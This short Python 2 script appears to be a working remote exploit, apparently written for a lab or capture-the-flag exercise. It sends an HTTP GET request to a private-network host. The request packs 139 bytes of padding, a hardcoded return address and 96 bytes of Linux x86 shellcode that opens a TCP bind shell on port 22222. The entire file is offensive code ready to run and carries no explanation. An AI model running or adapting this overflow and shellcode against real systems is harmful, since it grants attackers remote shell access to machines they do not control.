from zio import *

port_number = "\x56\xce" # 22222

# Linux x86 - TCP Bind Shell - 96 bytes
sc = "\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x43\x52\x66\x68"+port_number+"\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x92\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"

junk = "A"*139
ret = "\x95\xf9\xff\xbf"
print len(sc)
io = zio(("192.168.222.132", 20000))
io.read_until("\n")
io.writeline("GET /"+junk+ret+" HTTP/1.1"+sc)
